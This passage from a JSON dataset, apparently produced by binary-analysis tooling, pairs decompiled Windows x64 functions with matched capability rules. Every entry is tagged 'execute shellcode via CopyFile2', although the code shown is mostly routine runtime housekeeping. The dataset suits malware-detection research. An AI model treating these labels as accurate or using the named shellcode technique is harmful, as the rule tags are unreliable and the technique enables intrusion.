        "decompiled_code": "\nulong fcn.14000ec50(ulong *arg1)\n\n{\n    ulong *apuStackX8 [4];\n    \n    apuStackX8[0] = arg1;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0x22474343, 0, 1, apuStackX8);\n    (*apuStackX8[0][2])(1, 0x1a, *apuStackX8[0], apuStackX8[0], 0, apuStackX8[0][6]);\n    return 0x10;\n}\n",
        "token_count": 130
    },
    "1400ad88": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400ad880(ulong *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = 0x14010c370;\n    fcn.1400ac890(arg1, 0);\n    fcn.1400ac930(arg1);\n    if (arg1[0x19] != arg1 + 8) {\n        if (arg1[0x19] != NULL) {\n            fcn.1400b64c0();\n        }\n        arg1[0x19] = 0;\n    }\n    arg1_00 = arg1[0x1a];\n    if (arg1_00 != *0x1400fb720) {\n        if (**0x140102a70 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.14009f4c0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "14007de4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.14007de40(ulong *arg1, ulong noname_1, int64_t *arg3, uchar (*arg4) [16])\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uchar (*in_stack_00000028) [16];\n    uchar in_stack_00000030;\n    ulong in_stack_00000038;\n    int32_t *in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t *in_stack_00000050;\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    ulong uStack104;\n    uint64_t uStack96;\n    uchar uStack81;\n    int64_t iStack80;\n    \n    uVar1 = *(*arg4 + 8);\n    auStack120 = *arg4;\n    auStack136 = *in_stack_00000028;\n    if (in_stack_00000048 == 0) {\n        iStack80 = fcn.140075910(0, 0);\n        (**(*arg3 + 0x18))(&uStack104, arg3, auStack120, auStack136, in_stack_00000030, in_stack_00000038);\n        piVar4 = *0x140102a70;\n        if (*in_stack_00000040 == 0) {\n            if (in_stack_00000050[4] != NULL) {\n                (*in_stack_00000050[4])(in_stack_00000050);\n            }\n            piVar4 = *0x140102a70;\n            if (*(iStack80 + -8) < 0) {\n                iVar3 = fcn.1400760a0(iStack80 + -0x18, &uStack81, 0);\n                piVar4 = *0x140102a70;\n            }\n            else {\n                iVar3 = iStack80;\n                if (**0x140102a70 == 0) {\n                    *(iStack80 + -8) = *(iStack80 + -8) + 1;\n                }\n                else {\n                    LOCK();\n                    *(iStack80 + -8) = *(iStack80 + -8) + 1;\n                }\n            }\n            *in_stack_00000050 = iVar3;\n            in_stack_00000050[1] = *(iStack80 + -0x18);\n            in_stack_00000050[4] = 0x140080850;\n        }\n        iVar2 = *piVar4;\n        *arg1 = uStack104;\n        arg1[1] = uVar1 & 0xffffffff00000000 | uStack96 & 0xffffffff;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack80 + -8);\n            *(iStack80 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar4 = iStack80 + -8;\n            iVar2 = *piVar4;\n            *piVar4 = *piVar4 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.140075f90(iStack80 + -0x18, &uStack81);\n        }\n    }\n    else {\n        auStack120 = auStack136;\n        uStack104 = **arg4;\n        uStack96 = uVar1;\n        (**(*arg3 + 0x10))(arg1, arg3, &uStack104, auStack120, in_stack_00000030);\n    }\n    return arg1;\n}\n",
        "token_count": 789
    },
    "14007e08": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.14007e080(ulong *arg1, ulong noname_1, int64_t *arg3, ulong *arg4)\n\n{\n    uint64_t uVar1;\n    ulong *in_stack_00000028;\n    uchar in_stack_00000030;\n    int32_t *in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t *in_stack_00000050;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    uint64_t uStack96;\n    ulong uStack88;\n    uint64_t uStack80;\n    uchar *puStack72;\n    int64_t iStack64;\n    uchar auStack56 [16];\n    \n    uStack104 = *arg4;\n    uVar1 = arg4[1];\n    uStack120 = *in_stack_00000028;\n    uStack112 = in_stack_00000028[1];\n    if (in_stack_00000048 == 0) {\n        iStack64 = 0;\n        auStack56[0] = 0;\n        uStack96 = uVar1;\n        puStack72 = auStack56;\n        (**(*arg3 + 0x18))(uStack120, &uStack88, arg3, &uStack104, &uStack120, in_stack_00000030);\n        if (*in_stack_00000040 == 0) {\n            if (in_stack_00000050[4] != NULL) {\n                (*in_stack_00000050[4])(in_stack_00000050);\n            }\n            *in_stack_00000050 = in_stack_00000050 + 2;\n            fcn.1400a1540(in_stack_00000050, puStack72, puStack72 + iStack64);\n            in_stack_00000050[4] = 0x1400808b0;\n        }\n        *arg1 = uStack88;\n        arg1[1] = uVar1 & 0xffffffff00000000 | uStack80 & 0xffffffff;\n        if (puStack72 != auStack56) {\n            fcn.1400b64d0();\n        }\n    }\n    else {\n        uStack88 = uStack104;\n        uStack104 = uStack120;\n        uStack96 = uStack112;\n        uStack80 = uVar1;\n        (**(*arg3 + 0x10))(uStack120, arg1, arg3, &uStack88, &uStack104, in_stack_00000030);\n    }\n    return arg1;\n}\n",
        "token_count": 564
    },
    "14007e24": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.14007e240(ulong *arg1, ulong noname_1, int64_t *arg3, uchar (*arg4) [16])\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uchar (*in_stack_00000028) [16];\n    uchar in_stack_00000030;\n    ulong in_stack_00000038;\n    int32_t *in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t *in_stack_00000050;\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    ulong uStack104;\n    uint64_t uStack96;\n    uchar uStack81;\n    int64_t iStack80;\n    \n    uVar1 = *(*arg4 + 8);\n    auStack120 = *arg4;\n    auStack136 = *in_stack_00000028;\n    if (in_stack_00000048 == 0) {\n        iStack80 = fcn.14006c450(0, 0);\n        (**(*arg3 + 0x18))(&uStack104, arg3, auStack120, auStack136, in_stack_00000030, in_stack_00000038);\n        piVar4 = *0x140102a70;\n        if (*in_stack_00000040 == 0) {\n            if (in_stack_00000050[4] != NULL) {\n                (*in_stack_00000050[4])(in_stack_00000050);\n            }\n            piVar4 = *0x140102a70;\n            if (*(iStack80 + -8) < 0) {\n                iVar3 = fcn.14006cbb0(iStack80 + -0x18, &uStack81, 0);\n                piVar4 = *0x140102a70;\n            }\n            else {\n                iVar3 = iStack80;\n                if (**0x140102a70 == 0) {\n                    *(iStack80 + -8) = *(iStack80 + -8) + 1;\n                }\n                else {\n                    LOCK();\n                    *(iStack80 + -8) = *(iStack80 + -8) + 1;\n                }\n            }\n            *in_stack_00000050 = iVar3;\n            in_stack_00000050[1] = *(iStack80 + -0x18);\n            in_stack_00000050[4] = 0x1400808d0;\n        }\n        iVar2 = *piVar4;\n        *arg1 = uStack104;\n        arg1[1] = uVar1 & 0xffffffffffff0000 | uStack96 & 0xffff;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack80 + -8);\n            *(iStack80 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar4 = iStack80 + -8;\n            iVar2 = *piVar4;\n            *piVar4 = *piVar4 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.14006ca90(iStack80 + -0x18, &uStack81);\n        }\n    }\n    else {\n        auStack120 = auStack136;\n        uStack104 = **arg4;\n        uStack96 = uVar1;\n        (**(*arg3 + 0x10))(arg1, arg3, &uStack104, auStack120, in_stack_00000030);\n    }\n    return arg1;\n}\n",
        "token_count": 792
    },
    "14007e48": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.14007e480(ulong *arg1, ulong noname_1, int64_t *arg3, ulong *arg4)\n\n{\n    uint64_t uVar1;\n    ulong *in_stack_00000028;\n    uchar in_stack_00000030;\n    int32_t *in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t *in_stack_00000050;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    uint64_t uStack96;\n    ulong uStack88;\n    uint64_t uStack80;\n    ushort *puStack72;\n    int64_t iStack64;\n    ushort auStack56 [8];\n    \n    uStack104 = *arg4;\n    uVar1 = arg4[1];\n    uStack120 = *in_stack_00000028;\n    uStack112 = in_stack_00000028[1];\n    if (in_stack_00000048 == 0) {\n        iStack64 = 0;\n        auStack56[0] = 0;\n        uStack96 = uVar1;\n        puStack72 = auStack56;\n        (**(*arg3 + 0x18))(uStack120, &uStack88, arg3, &uStack104, &uStack120, in_stack_00000030);\n        if (*in_stack_00000040 == 0) {\n            if (in_stack_00000050[4] != NULL) {\n                (*in_stack_00000050[4])(in_stack_00000050);\n            }\n            *in_stack_00000050 = in_stack_00000050 + 2;\n            fcn.1400a4eb0(in_stack_00000050, puStack72, puStack72 + iStack64);\n            in_stack_00000050[4] = 0x140080930;\n        }\n        *arg1 = uStack88;\n        arg1[1] = uVar1 & 0xffffffffffff0000 | uStack80 & 0xffff;\n        if (puStack72 != auStack56) {\n            fcn.1400b64d0();\n        }\n    }\n    else {\n        uStack88 = uStack104;\n        uStack104 = uStack120;\n        uStack96 = uStack112;\n        uStack80 = uVar1;\n        (**(*arg3 + 0x10))(uStack120, arg1, arg3, &uStack88, &uStack104, in_stack_00000030);\n    }\n    return arg1;\n}\n",
        "token_count": 563
    },
    "14008095": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140080950(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar uStack57;\n    int64_t iStack56;\n    int64_t aiStack48 [2];\n    \n    iStack56 = fcn.140075a60(in_stack_00000038, in_stack_00000040 + in_stack_00000038);\n    (**(*arg2 + 0x18))(aiStack48, arg2, arg4, in_stack_00000028, in_stack_00000030, &iStack56);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    piVar4 = *0x140102a70;\n    if (*(aiStack48[0] + -8) < 0) {\n        iVar3 = fcn.1400760a0(aiStack48[0] + -0x18, &uStack57, 0);\n        piVar4 = *0x140102a70;\n    }\n    else {\n        iVar3 = aiStack48[0];\n        if (**0x140102a70 == 0) {\n            *(aiStack48[0] + -8) = *(aiStack48[0] + -8) + 1;\n        }\n        else {\n            LOCK();\n            *(aiStack48[0] + -8) = *(aiStack48[0] + -8) + 1;\n        }\n    }\n    iVar2 = *piVar4;\n    *arg3 = iVar3;\n    arg3[1] = *(aiStack48[0] + -0x18);\n    arg3[4] = 0x140080850;\n    if (iVar2 == 0) {\n        iVar2 = *(aiStack48[0] + -8);\n        *(aiStack48[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack48[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack48[0] + -0x18);\n    }\n    if (*piVar4 == 0) {\n        iVar2 = *(iStack56 + -8);\n        *(iStack56 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = iStack56 + -8;\n        iVar2 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.140075f90(iStack56 + -0x18, aiStack48);\n    return;\n}\n",
        "token_count": 699
    },
    "140080b0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140080b00(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    ulong arg1;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar *apuStack104 [2];\n    uchar auStack88 [16];\n    uchar *puStack72;\n    int64_t iStack64;\n    uchar auStack56 [16];\n    \n    apuStack104[0] = auStack88;\n    if ((in_stack_00000038 == 0) && (in_stack_00000040 != 0)) {\n        arg1 = fcn.1400a3d10();\n        if (puStack72 != auStack56) {\n            fcn.1400b64d0();\n        }\n        do {\n            if (apuStack104[0] != auStack88) {\n                fcn.1400b64d0();\n            }\n            arg1 = fcn.14000f000(arg1);\n        } while( true );\n    }\n    fcn.1400a1210(apuStack104, in_stack_00000038, in_stack_00000038 + in_stack_00000040);\n    (**(*arg2 + 0x18))(&puStack72, arg2, arg4, in_stack_00000028, in_stack_00000030, apuStack104);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    *arg3 = arg3 + 2;\n    fcn.1400a1540(arg3, puStack72, puStack72 + iStack64);\n    arg3[4] = 0x1400808b0;\n    if (puStack72 != auStack56) {\n        fcn.1400b64d0();\n    }\n    if (apuStack104[0] != auStack88) {\n        fcn.1400b64d0();\n    }\n    return;\n}\n",
        "token_count": 463
    },
    "140080c2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140080c20(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar uStack57;\n    int64_t iStack56;\n    int64_t aiStack48 [2];\n    \n    iStack56 = fcn.14006c5c0(in_stack_00000038, in_stack_00000038 + in_stack_00000040 * 2);\n    (**(*arg2 + 0x18))(aiStack48, arg2, arg4, in_stack_00000028, in_stack_00000030, &iStack56);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    piVar4 = *0x140102a70;\n    if (*(aiStack48[0] + -8) < 0) {\n        iVar3 = fcn.14006cbb0(aiStack48[0] + -0x18, &uStack57, 0);\n        piVar4 = *0x140102a70;\n    }\n    else {\n        iVar3 = aiStack48[0];\n        if (**0x140102a70 == 0) {\n            *(aiStack48[0] + -8) = *(aiStack48[0] + -8) + 1;\n        }\n        else {\n            LOCK();\n            *(aiStack48[0] + -8) = *(aiStack48[0] + -8) + 1;\n        }\n    }\n    iVar2 = *piVar4;\n    *arg3 = iVar3;\n    arg3[1] = *(aiStack48[0] + -0x18);\n    arg3[4] = 0x1400808d0;\n    if (iVar2 == 0) {\n        iVar2 = *(aiStack48[0] + -8);\n        *(aiStack48[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack48[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14006ca90(aiStack48[0] + -0x18);\n    }\n    if (*piVar4 == 0) {\n        iVar2 = *(iStack56 + -8);\n        *(iStack56 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = iStack56 + -8;\n        iVar2 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.14006ca90(iStack56 + -0x18, aiStack48);\n    return;\n}\n",
        "token_count": 707
    },
    "140080dd": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140080dd0(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    ulong arg1;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar *apuStack104 [2];\n    uchar auStack88 [16];\n    uchar *puStack72;\n    int64_t iStack64;\n    uchar auStack56 [16];\n    \n    apuStack104[0] = auStack88;\n    if ((in_stack_00000038 == 0) && (in_stack_00000040 != 0)) {\n        arg1 = fcn.1400a3d10();\n        if (puStack72 != auStack56) {\n            fcn.1400b64d0();\n        }\n        do {\n            if (apuStack104[0] != auStack88) {\n                fcn.1400b64d0();\n            }\n            arg1 = fcn.14000f000(arg1);\n        } while( true );\n    }\n    fcn.1400a4ce0(apuStack104, in_stack_00000038, in_stack_00000038 + in_stack_00000040 * 2);\n    (**(*arg2 + 0x18))(&puStack72, arg2, arg4, in_stack_00000028, in_stack_00000030, apuStack104);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    *arg3 = arg3 + 2;\n    fcn.1400a4eb0(arg3, puStack72, puStack72 + iStack64 * 2);\n    arg3[4] = 0x140080930;\n    if (puStack72 != auStack56) {\n        fcn.1400b64d0();\n    }\n    if (apuStack104[0] != auStack88) {\n        fcn.1400b64d0();\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "14008527": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140085270(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    \n    *arg1 = *0x140103330 + 0x10;\n    arg1_00 = arg1 + 7;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg1[4] = 0;\n    arg1[5] = 0;\n    arg1[6] = 0;\n    fcn.14009fa40(arg1_00);\n    *arg1 = 0x14010aa70;\n    *(arg1 + 8) = 0;\n    arg1[9] = 0;\n    fcn.14007c400(arg1 + 10);\n    arg1[0xe] = 0;\n    arg1[0xf] = 0x1000;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x13) = 0;\n    arg1[0x16] = 0;\n    *(arg1 + 0xc) = 0x0;\n    *(arg1 + 0x11) = 0x0;\n    *(arg1 + 0x14) = 0x0;\n    *(arg1 + 0x17) = 0x0;\n    cVar1 = fcn.1400b26c0(arg1_00);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    iVar2 = fcn.1400b3760(arg1_00);\n    arg1[0x14] = iVar2;\n    return;\n}\n",
        "token_count": 387
    },
    "14008553": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140085530(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    \n    *arg1 = *0x140103330 + 0x10;\n    arg1_00 = arg1 + 7;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg1[4] = 0;\n    arg1[5] = 0;\n    arg1[6] = 0;\n    fcn.14009fa40(arg1_00);\n    *arg1 = 0x14010aa70;\n    *(arg1 + 8) = 0;\n    arg1[9] = 0;\n    fcn.14007c400(arg1 + 10);\n    arg1[0xe] = 0;\n    arg1[0xf] = 0x1000;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x13) = 0;\n    arg1[0x16] = 0;\n    *(arg1 + 0xc) = 0x0;\n    *(arg1 + 0x11) = 0x0;\n    *(arg1 + 0x14) = 0x0;\n    *(arg1 + 0x17) = 0x0;\n    cVar1 = fcn.1400b26c0(arg1_00);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    iVar2 = fcn.1400b3760(arg1_00);\n    arg1[0x14] = iVar2;\n    return;\n}\n",
        "token_count": 387
    },
    "1400878e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400878e0(char **arg1)\n\n{\n    char **arg1_00;\n    char cVar1;\n    char *pcVar2;\n    \n    *arg1 = *0x140103340 + 0x10;\n    arg1_00 = arg1 + 7;\n    arg1[1] = NULL;\n    arg1[2] = NULL;\n    arg1[3] = NULL;\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[6] = NULL;\n    fcn.14009fa40(arg1_00);\n    *arg1 = \"P}\\b@\\x01\";\n    *(arg1 + 8) = 0;\n    arg1[9] = NULL;\n    fcn.14007c400(arg1 + 10);\n    arg1[0xe] = NULL;\n    arg1[0xf] = 0x1000;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x82) = 0;\n    *(arg1 + 0x84) = 0;\n    *(arg1 + 0x13) = 0;\n    arg1[0x16] = NULL;\n    *(arg1 + 0xc) = 0x0;\n    *(arg1 + 0x11) = 0x0;\n    *(arg1 + 0x14) = 0x0;\n    *(arg1 + 0x17) = 0x0;\n    cVar1 = fcn.1400b2720(arg1_00);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.1400b37c0(arg1_00);\n    arg1[0x14] = pcVar2;\n    return;\n}\n",
        "token_count": 406
    },
    "140087bb": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140087bb0(char **arg1)\n\n{\n    char **arg1_00;\n    char cVar1;\n    char *pcVar2;\n    \n    *arg1 = *0x140103340 + 0x10;\n    arg1_00 = arg1 + 7;\n    arg1[1] = NULL;\n    arg1[2] = NULL;\n    arg1[3] = NULL;\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[6] = NULL;\n    fcn.14009fa40(arg1_00);\n    *arg1 = \"P}\\b@\\x01\";\n    *(arg1 + 8) = 0;\n    arg1[9] = NULL;\n    fcn.14007c400(arg1 + 10);\n    arg1[0xe] = NULL;\n    arg1[0xf] = 0x1000;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x82) = 0;\n    *(arg1 + 0x84) = 0;\n    *(arg1 + 0x13) = 0;\n    arg1[0x16] = NULL;\n    *(arg1 + 0xc) = 0x0;\n    *(arg1 + 0x11) = 0x0;\n    *(arg1 + 0x14) = 0x0;\n    *(arg1 + 0x17) = 0x0;\n    cVar1 = fcn.1400b2720(arg1_00);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.1400b37c0(arg1_00);\n    arg1[0x14] = pcVar2;\n    return;\n}\n",
        "token_count": 405
    },
    "1400ac9e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400ac9e0(void)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    code *pcVar6;\n    int32_t *piVar7;\n    int64_t *piVar8;\n    int64_t *piVar9;\n    int64_t *piVar10;\n    uchar (*pauVar11) [16];\n    uchar (*pauVar12) [16];\n    uchar (*pauVar13) [16];\n    int64_t iVar14;\n    uchar auVar15 [16];\n    uchar auVar16 [16];\n    \n    pcVar6 = *0x1400f9540;\n    auVar15 = CONCAT88(*0x1401032e0 + 0x40, *0x1401032e0 + 0x18);\n    auVar16 = CONCAT88(*0x1401031e0 + 0x40, *0x1401031e0 + 0x18);\n    **0x140102f60 = 1;\n    iVar14 = (*pcVar6)(1);\n    iVar2 = *0x140103330;\n    piVar10 = *0x140102ad0;\n    piVar1 = *0x140102ad0 + 7;\n    (*0x140102ad0)[1] = 0;\n    iVar2 = iVar2 + 0x10;\n    piVar10[2] = 0;\n    *piVar10 = iVar2;\n    piVar10[3] = 0;\n    piVar10[4] = 0;\n    piVar10[5] = 0;\n    piVar10[6] = 0;\n    fcn.14009fa40(piVar1);\n    iVar3 = *0x1401030d0;\n    piVar10[8] = iVar14;\n    *(piVar10 + 9) = 0xffffffff;\n    iVar3 = iVar3 + 0x10;\n    *piVar10 = iVar3;\n    iVar14 = (*pcVar6)(0);\n    piVar8 = *0x140102ab0;\n    piVar1 = *0x140102ab0 + 7;\n    **0x140102ab0 = iVar2;\n    piVar8[1] = 0;\n    piVar8[2] = 0;\n    piVar8[3] = 0;\n    piVar8[4] = 0;\n    piVar8[5] = 0;\n    piVar8[6] = 0;\n    fcn.14009fa40(piVar1);\n    *piVar8 = iVar3;\n    piVar8[8] = iVar14;\n    *(piVar8 + 9) = 0xffffffff;\n    iVar14 = (*pcVar6)(2);\n    piVar9 = *0x140102ac0;\n    piVar1 = *0x140102ac0 + 7;\n    **0x140102ac0 = iVar2;\n    piVar9[1] = 0;\n    piVar9[2] = 0;\n    piVar9[3] = 0;\n    piVar9[4] = 0;\n    piVar9[5] = 0;\n    